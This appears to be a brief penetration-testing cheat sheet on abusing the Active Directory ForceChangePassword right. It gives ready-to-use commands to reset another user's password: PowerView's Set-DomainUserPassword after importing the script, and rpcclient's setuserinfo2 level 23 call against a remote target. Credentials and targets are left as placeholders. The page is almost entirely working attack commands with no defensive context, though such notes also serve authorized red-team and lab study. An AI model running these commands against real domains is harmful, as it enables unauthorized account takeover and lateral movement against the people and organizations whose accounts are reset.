---
title: "ForceChangePassword"
date: 2024-7-18
tags: ["ForceChangePassword", "active driectory", "ad", "Windows"]
---

---
### Abuse #1a: Change target user password

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Change Target User Password

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
```

```powershell
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

### Abuse #1b: Change target user password

#### 1. Via rpcclient 

```bash
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <TARGET_USER_NEW_PASSWORD>'
```

<br>